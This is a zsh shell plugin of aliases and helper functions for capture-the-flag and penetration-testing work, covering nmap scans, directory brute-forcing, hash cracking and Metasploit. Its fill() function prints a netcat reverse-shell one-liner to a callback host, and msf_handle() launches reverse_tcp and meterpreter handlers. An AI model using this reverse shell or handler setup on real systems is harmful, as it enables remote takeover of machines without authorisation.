#!/usr/bin/env zsh

#
# VARIABLES
#

export DIRLIST="/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt"
export HAKVARS=~/hakvars
export PASSLIST="/usr/share/wordlists/rockyou.txt"

#
# ALIASES
#

alias dlcu='tpl certutil'
alias dlps='tpl ps_dl'
alias f='focus'
alias hcat='h_hashcat'
alias hcatshow='hashcat --show'
alias jrock='john --wordlist=$PASSLIST'
alias jshow='john --show'
alias msf=msfconsole
alias s='sync'
alias sshclean='ssh-keygen -R rhost'
alias ve='me tun0'
alias vpn='sudo -b openvpn'
alias vpnkill='sudo pkill openvpn'
alias vpnshow='pgrep -a openvpn'

#
# FUNCTIONS
#

add_host(){
    HOST=${1:="rhost"}
    IP=${2:-$RHOST}
    sudo sed -i /$HOST$/d /etc/hosts
    echo "$IP $HOST" | sudo tee -a /etc/hosts
}

clip() {
    FILE=$1
    cat $FILE | xclip -selection clipboard
}

fill() {
    cmd="rm /tmp/f;mkfifo /tmp/f;cat /tmp/f | /bin/bash -i 2>&1 | nc $LHOST $LPORT > /tmp/f"
    echo "$cmd"
}

# Select target ip:port
focus() {
    IP=${1:-"EMPTY"}
    PORT=${2:-"EMPTY"}
    # Set shell variables
    [[ "$IP" != "EMPTY" ]] && export RHOST="$IP"
    [[ "$PORT" != "EMPTY" ]] && export RPORT="$PORT"
    # Add target to hosts file as rhost replacing as necessary
    add_host
    # Add variables to sync $HAKVARS file 
    sed -i "/export RHOST=*/d" $HAKVARS
    echo "export RHOST=$RHOST" >> $HAKVARS
    sed -i "/export RPORT=*/d" $HAKVARS
    echo "export RPORT=$RPORT" >> $HAKVARS
    echo -e "\$RHOST: ${RHOST:-"NOT SET"}\n\$RPORT: ${RPORT:-"NOT SET"}\n"
}

play() {
    CMD=${1:-"info"}
    if [[ $CMD == "info" ]]; then
        cat ~/.oh-my-zsh/custom/plugins/tg_hacker/commands | cut -d "#" -f 1
        return
    fi
    eval $(grep "$CMD" ~/.oh-my-zsh/custom/plugins/tg_hacker/commands | cut -d "#" -f 2 )
} 

# Set local callback port
lport() {
    LPORT=${1:-"4444"} 
    if [[ -f $HAKVARS ]]; then
        sed -i "/export LPORT=*/d" $HAKVARS
        echo "export LPORT=$LPORT" >> $HAKVARS
    fi
    echo "LPORT: $LPORT"
}

listen() {
    [[ -z $LPORT ]] || lport
    nc -lvnp $LPORT
}

# Get ip address of local interface default: eth0
me() {
    iface=${1:-"eth0"}
    export LHOST=$(ifconfig $iface | grep "inet " | cut -b 9- | cut  -d" " -f2)
    echo -n $LHOST | xclip -selection c
    if [[ -f $HAKVARS ]]; then
        sed -i "/export LHOST=*/d" $HAKVARS
        echo "export LHOST=$LHOST" >> $HAKVARS
    fi
    echo "LHOST: $LHOST"
}

# Copy rhost to clipboard
rhost() {
    echo -n $RHOST | xclip -selection c
    echo "RHOST: $RHOST"
}

# Launch python http server in current folder 
serve() {
    PORT=${1:-80}
    DIR=${2:-$(pwd)}
    echo "Serving files from $DIR"
    if type python3 >/dev/null 2>&1; then
       python3 -m http.server "$PORT"
    else
       python -m SimpleHTTPServer "$PORT" 
    fi
}

# Sync env variables from $HAKVARS file
sync() {
    base=${1:-$(pwd)}
    if [[ ! -f $HAKVARS ]]; then
        h_init
    fi
    sed -i "/^base=/d" $HAKVARS
    echo "base=$base" >> $HAKVARS
    . $HAKVARS
    cat $HAKVARS
    . ~/.oh-my-zsh/custom/plugins/tg_hacker/tg_hacker.plugin.zsh
}

#
# HAK FUNCTIONS
#

# Initialize ctf folder
h_init() {
    base=${1:-$(pwd)}
    [[ -d $base ]] || mkdir -p $base
    cd $base
    base=$(pwd)
    echo "#!/usr/bin/env zsh" > $HAKVARS 
    echo "base=$base" >> $HAKVARS
    echo "export LPORT=4444" >> $HAKVARS
    ve
    touch notes.txt
}

h_ffuf(){
    HOST=${2:-$RHOST}
    PORT=${1:-80}
    WORDLIST=${3:-$DIRLIST}
    OUTPUT=ffuf.$IP-$PORT.txt
    touch $OUTPUT
    ffuf -w $WORDLIST -u http://$HOST:$PORT/FUZZ -o $OUTPUT -of csv -c 
}

h_gobuster(){
    HOST=${1:-$RHOST}
    PORT=${2:-80}
    WORDLIST=${3:-$DIRLIST}
    OUTPUT=gobuster.$IP-$PORT.txt
    touch $OUTPUT
    echo "gobuster dir -t 50 -o $OUTPUT -w $WORDLIST -u http://$HOST:$PORT -x html,php,txt,js,css,py"
    gobuster dir -t 50 -o $OUTPUT -w "$WORDLIST" -u http://"$HOST":"$PORT" -x html,php,txt,js,css,py
}

h_hashcat() {
    MODE=${1}
    HASHES=${2:-"hashes.txt"}
    ATTACK=${3:-0}
    WORDLIST=${4:-"$PASSLIST"}
    echo "hashcat -m $MODE -a $ATTACK $HASHES $WORDLIST"
    hashcat -m $MODE -a $ATTACK $HASHES $WORDLIST
}

h_ssh() {
    sshclean
    ssh "$@"
}

h_web() {
    PORT=${1:-80}
    IP=${2:-$RHOST}
    OUTPUT=nikto.txt
    touch $OUTPUT
    whatweb -v -a 3 "$IP" | tee whatweb.txt 
    nikto -host "$IP" -port "$PORT" -output $OUTPUT -Format txt
}

#
# NMAP
#

alias nmap_ "sudo nmap -vv -Pn -n -T5"
alias nmap_basic="sudo nmap -vv -Pn -n -T5 -oN nmap.basic.txt"
alias nmap_basic_all="sudo nmap -vv -Pn -n -T5 -p- -oN nmap.basic.all.txt"
alias nmap_full="sudo nmap -vv -n -T5 -A -oN nmap.full.txt"
alias nmap_full_all="sudo nmap -vv -n -T5 -A -p- -oN nmap.full.all.txt"
alias nmap_script="sudo nmap -vv -Pn -n -T5 -sC -sV -oN nmap.script.txt"
alias nmap_script_all="sudo nmap -vv -Pn -n -T5 -sC -sV -p- -oN nmap.script.all.txt"

nmap_get_ports(){
    IP=${1:-$ip}
    sudo nmap -vv -Pn -T4 -p- $IP -oN nmap.ports.txt
    nmap_parse_ports
}

nmap_parse_ports() {
    FILE=${1:-"nmap.ports.txt"} 
    RPORTS=$(cat $FILE | grep -P '^\d+' | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//);
    sed -i "/^export RPORTS=*/d" $HAKVARS
    echo "export RPORTS=$RPORTS" >> $HAKVARS
    echo "RPORTS=$RPORTS"
}

#
# METASPLOIT
#

msf_handle() {
    payloads=("linux/x64/meterpreter/reverse_tcp" "linux/x64/shell_reverse_tcp" "linux/x86/meterpreter/reverse_tcp" "linux/x86/shell_reverse_tcp" "windows/meterpreter/reverse_tcp" "windows/x64/meterpreter/reverse_tcp")
    select PAYLOAD in "${payloads[@]}"; do
        echo "msfconsole -x 'use exploit/multi/handler; set LHOST $LHOST; set LPORT $LPORT; set payload $PAYLOAD; run;'"
        msfconsole -x "use exploit/multi/handler; set LHOST $LHOST; set LPORT $LPORT; set payload $PAYLOAD; run;"
        break;
    done
}
